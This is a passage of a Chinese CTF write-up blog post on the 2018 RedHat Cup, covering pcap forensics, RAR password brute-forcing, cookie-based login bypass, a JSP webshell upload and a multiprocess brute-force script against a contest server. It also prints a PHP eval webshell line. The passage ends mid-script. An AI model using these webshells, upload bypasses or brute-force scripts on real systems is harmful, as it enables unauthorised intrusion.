@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,writeup,requests," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 Not only wiresharkhint:tshark这题给了一个pcap包，当时并没有做出来，我靠如果我先去打了铁人三项的数据分析赛再来做这个简直好做多了包里面有一系列可疑的GET请求">
+<meta name="keywords" content="CTF,writeup,requests">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018-第二届红帽杯-writeup">
+<meta property="og:url" content="http://yoursite.com/2018/05/06/RedHat/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="0x00 Not only wiresharkhint:tshark这题给了一个pcap包，当时并没有做出来，我靠如果我先去打了铁人三项的数据分析赛再来做这个简直好做多了包里面有一系列可疑的GET请求">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/34.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/37.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/36.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/38.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/a.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/21.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/22.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/23.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/24.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/25.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/26.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/27.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/28.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/29.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/30.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/31.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/32.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/33.png">
+<meta property="og:updated_time" content="2018-05-06T18:13:45.779Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018-第二届红帽杯-writeup">
+<meta name="twitter:description" content="0x00 Not only wiresharkhint:tshark这题给了一个pcap包，当时并没有做出来，我靠如果我先去打了铁人三项的数据分析赛再来做这个简直好做多了包里面有一系列可疑的GET请求">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/34.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/05/06/RedHat/"/>
+
+
+
+
+
+  <title>2018-第二届红帽杯-writeup | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">多渴望滴下为自由流的汗.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/06/RedHat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018-第二届红帽杯-writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-05-06T21:44:44+08:00">
+                2018-05-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-Not-only-wireshark"><a href="#0x00-Not-only-wireshark" class="headerlink" title="0x00 Not only wireshark"></a>0x00 Not only wireshark</h1><p>hint:tshark<br>这题给了一个pcap包，当时并没有做出来，我靠如果我先去打了铁人三项的数据分析赛再来做这个简直好做多了<br>包里面有一系列可疑的GET请求<a id="more"></a><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/34.png" alt="image"><br>把它们导出并连起来，放虚拟机里面，然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r x.pcapng -e http.request.uri -T fields -Y &apos;http.request.uri&apos; | grep -P &apos;name=[A-F0-9]&#123;3&#125;&apos; | awk -F &apos;=&apos; &apos;&#123;printf $2&#125;&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/37.png" alt="image"><br>成功导出，注意到开头的123404B，联想到504B是zip文件的文件头，然后，改一下放hxd里得到一个zip，有密码，然后，在pcap里面搜字符串key，找到密码<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/36.png" alt="image">这题告诉我们，要记住一些常见的文件头，不然你看到都想不起来啊！<br><strong>flag{1m_s0_ang4y_1s}</strong></p>
+<h1 id="0x01-听说你们喜欢手工爆破"><a href="#0x01-听说你们喜欢手工爆破" class="headerlink" title="0x01  听说你们喜欢手工爆破"></a>0x01  听说你们喜欢手工爆破</h1><p>hint:flag{}内英文字母为大写形式<br>给了个iso压缩包，里面有无数个txt，还有个叫情系海边之城的有密码的rar，里面有个doc<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/6.png" alt="image">解压出来之后，先随便点开看了几个txt，里面都是相同的base64,<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/38.png" alt="image">解码出来是<code>Th3r3 1s n0 f1ag</code>，写个脚本，看看是不是所有txt内容都是这样的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path=<span class="string">"C:/Users/18145/Desktop/gogo"</span></span><br><span class="line">files=os.listdir(path)</span><br><span class="line">s=[]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):</span><br><span class="line">			f=open(path+<span class="string">'/'</span>+file)</span><br><span class="line">			a=f.readline()</span><br><span class="line">			<span class="keyword">if</span> a.split(<span class="string">"G"</span>)[<span class="number">1</span>]!=<span class="string">"gzcjMgMXMgbjAgZjFhZw=="</span>:</span><br><span class="line">				s.append(a)</span><br><span class="line">	<span class="keyword">print</span> s</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	<span class="keyword">print</span> e</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/7.png" alt="image">发现确实没有例外，全是一样的base64，然后，想到从文件名入手，用文件名作为字典对rar进行爆破<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_name</span><span class="params">(file_dir)</span>:</span>   </span><br><span class="line">	L=[]   </span><br><span class="line">	<span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(file_dir):  </span><br><span class="line">		<span class="keyword">for</span> file <span class="keyword">in</span> files:  </span><br><span class="line">			<span class="keyword">if</span> file.split(<span class="string">'.'</span>)[<span class="number">1</span>]==<span class="string">'txt'</span>:</span><br><span class="line">				L.append(file.split(<span class="string">'.'</span>)[<span class="number">0</span>]) <span class="comment">#生成字典用</span></span><br><span class="line">	<span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptRarZipFile</span><span class="params">(filename)</span>:</span></span><br><span class="line">	fp=rarfile.RarFile(filename)</span><br><span class="line">	desPath=filename[:<span class="number">-4</span>]</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(desPath):</span><br><span class="line">		os.mkdir(desPath)</span><br><span class="line">	f=open(<span class="string">'txt-names.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">	line=f.readline()</span><br><span class="line">	<span class="keyword">while</span> line:</span><br><span class="line">		line=line.strip(<span class="string">'\n'</span>)</span><br><span class="line">		<span class="comment"># with open('test.txt','a') as w:</span></span><br><span class="line">		<span class="comment"># 	w.write(line+'\n')</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			fp.extractall(path=desPath,pwd=line)</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"success!!====&gt;"</span>+line</span><br><span class="line">			fp.close()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			<span class="keyword">print</span> e</span><br><span class="line">			line=f.readline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	rarName=<span class="string">'C:/Users/18145/Desktop/boom/bythesea.rar'</span></span><br><span class="line">	decryptRarZipFile(rarName)</span><br><span class="line">	<span class="comment"># print file_name('C:/Users/18145/Desktop/gogo')</span></span><br></pre></td></tr></table></figure></p>
+<p>代码会调用windows的unrar工具，一开始我不知道自己没有，而且程序跑完不报错，导致我以为思路错了，浪费很多时间。后面加了个try except，把错误print出来才发现，以后都要养成把错误print出来的习惯，不然就等死吧<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/1.png" alt="image">然后，安装好unrar工具包，再跑就出来了<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/2.png" alt="image">这时候发现，doc也有密码，用工具，爆出来密码5693<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/8.png" alt="image">打开word，发现如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">李（卡西·阿弗莱克 Casey Affleck 饰）是一名颓废压抑的修理工，在得知哥哥乔伊（凯尔·钱德勒 Kyle Chandler 饰）去世的消息后，李回到了故乡——大海边处理乔伊的后事。根据乔伊的遗嘱，李将会成为乔伊的儿子帕特里克（卢卡斯·赫奇斯 Lucas Hedg es 饰）的监护人，李打算将帕特里克带回波士顿，但很显然帕特里克并不愿意离开家乡和朋友们，但李亦不愿在这片伤心地久留。 </span><br><span class="line">原来，这里埋藏着李的一段绝望的回忆，他的过失使得两个女儿葬身火海，妻子兰迪（米歇尔·威廉姆斯 Michelle Williams 饰）亦因此而离开了他。此次重回故乡，李再度见到了已经再婚并且即将做妈妈的兰迪，与此同时，帕特里克那失踪已久的母亲艾丽斯（格瑞辰·摩尔 Gretchen Mol 饰）亦联系上了帕特里克，告诉他，她还深爱着他，希望他能回来找她。艾丽斯还告诉了他，她现在住在F5街区F5街道07号幢，并给他邮箱发了新家里的门禁解锁代码：“123654AAA678876303555111AAA77611A321”，希望他能够成为她的新家庭中的一员。</span><br></pre></td></tr></table></figure></p>
+<p>哦，一脸懵逼<br>很快就因为情系海边之城别名是海边的曼彻斯特，联想到了曼彻斯特编码，只是，还是不会做，这里给出官方payload<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0x123654AAA678876303555111AAA77611A321</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">bs=<span class="string">'0'</span>+bin(n)[<span class="number">2</span>:]</span><br><span class="line">r=<span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> hex(int(s,<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(bs),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> bs[i:i+<span class="number">2</span>]==<span class="string">'01'</span>:</span><br><span class="line">                        r+=<span class="string">'0'</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        r+=<span class="string">'1'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(r),<span class="number">8</span>):</span><br><span class="line">        tmp=r[i:i+<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">        flag+=conv(tmp[:<span class="number">4</span>])</span><br><span class="line">        flag+=conv(tmp[<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag"</span>+<span class="string">"&#123;"</span>+flag.upper()+<span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure></p>
+<p>这题没做出来实在是可惜。<br><strong>flag{5EFCF5F507AA5FAD77}</strong></p>
+<h1 id="0x02-这是道web题？"><a href="#0x02-这是道web题？" class="headerlink" title="0x02 这是道web题？"></a>0x02 这是道web题？</h1><p>这题也没做出来，给了一个cms的后台代码，很多很多个文件，首先用D盾去扫<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/9.png" alt="image">扫到关键文件，里面代码如下<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/10.png" alt="image">，解码出来是<code>[@eval(base64_decode($_POST[z0]));]</code>，然后，注释有提示<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/11.png" alt="image">要用tshark，那肯定要看pcap包了，搜索所有的pcap包，发现有个2M多的，既然它最大，就决定是它了，然后到处http对象，发现一个最可疑的，导出<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/12.png" alt="image">打开后发现并不是php代码，放binwalk看看<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/13.png" alt="image">发现有个jpg，有个gif，foremost分离出来，发现gif是残缺的，可能是我没有掌握正确的分离方法，不过可以手动分离，gif是经典的“sorry，有钱，真系大晒个喔”系列动图<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/a.gif" alt="image">给了一串unicode编码，拿去解码，得flag<br><strong>flag{S022y4orr5}</strong></p>
+<h1 id="0x03-simple-upload"><a href="#0x03-simple-upload" class="headerlink" title="0x03 simple upload"></a>0x03 simple upload</h1><p>进入页面后，尝试登录，抓包<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/14.png" alt="image">Cookie的admin参数改为1，然后登录成功。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/15.png" alt="image">尝试上传文件，发现只要content-type是image/jpeg就能上传成功。<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/16.png" alt="image">然后，改一个jpg文件，上传<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/17.png" alt="image">试图执行其中的代码，发现报错，发现后台是tomcat<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/18.png" alt="image">(其实这里有点多此一举，直接乱打一波也能发现是tomcat)然后传jsp马，再用菜刀连，注意要设置cookie<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/19.png" alt="image">发现flag<br><strong>flag{7773cffc-a9ea-4542-aea2-f42336a21a8c}</strong></p>
+<h1 id="0x04-shopping-log"><a href="#0x04-shopping-log" class="headerlink" title="0x04 shopping log"></a>0x04 shopping log</h1><p>进到题目页面，发现一片空白，然后，f12<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/21.png" alt="image">改host<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/22.png" alt="image">然后，改referer<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/23.png" alt="image">返回一个location，访问下<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/24.png" alt="image">Japan sales only，然后 改语言，ja<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/25.png" alt="image">返回一个location，访问<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/RedHat/26.png" alt="image">写脚本，验证码暴力破，然后，题目有提示不从0000开始，那就从9999开始<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Host"</span>: <span class="string">"www.tmvb.com"</span></span><br><span class="line">		,<span class="string">"Accept-Language"</span>: <span class="string">"ja"</span></span><br><span class="line">		,<span class="string">"Referer"</span>: <span class="string">"www.dww.com"</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://120.132.95.234/5a560e50e61b552d34480017c7877467info.php"</span></span><br><span class="line">url2 = <span class="string">"http://120.132.95.234/api.php?action=report"</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCode</span><span class="params">(ss)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r = ss.get(url=url1,headers=headers,proxies=proxies)</span><br><span class="line"></span><br><span class="line">		m = re.findall(<span class="string">r'=== \'(.*)\'&lt;/p&gt;'</span>,r.content)</span><br><span class="line">		result = m[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">		i = <span class="number">0</span></span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">			m2 = hashlib.md5()   </span><br><span class="line">			m2.update(str(i))   </span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> m2.hexdigest()[<span class="number">0</span>:<span class="number">6</span>] == result:</span><br><span class="line">				<span class="keyword">return</span> i</span><br><span class="line">			i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(num)</span>:</span></span><br><span class="line">	ss = requests.session()</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		ss.get(url=url1,headers=headers,proxies=proxies)</span><br><span class="line"></span><br><span class="line">		code = getCode(ss)</span><br><span class="line">		r = ss.post(url = url2,data = &#123;<span class="string">"TxtTid"</span>:num, <span class="string">"code"</span>:code&#125;,headers=headers,proxies=proxies)</span><br><span class="line">		<span class="keyword">if</span> (<span class="string">"no such order"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content):</span><br><span class="line">			<span class="keyword">print</span> num + r.content</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ask</span><span class="params">(q)</span>:</span>      </span><br><span class="line">    <span class="keyword">try</span>:         </span><br><span class="line">    	<span class="keyword">while</span>(q.qsize()!=<span class="number">0</span>):</span><br><span class="line">	        num = q.get(block = <span class="keyword">False</span>) </span><br><span class="line">	        run(num)</span><br><span class="line">	        <span class="keyword">print</span> num</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: </span><br><span class="line">    	<span class="keyword">print</span> e        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">    	q.put(str(i).zfill(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    workers = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    	worker = Process(target = ask, args=(q,))</span><br><span class="line">    	worker.start()</span><br><span class="line">    	workers.append(worker)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> worker <span class="keyword">in</span> workers:</span><br><span class="line">    	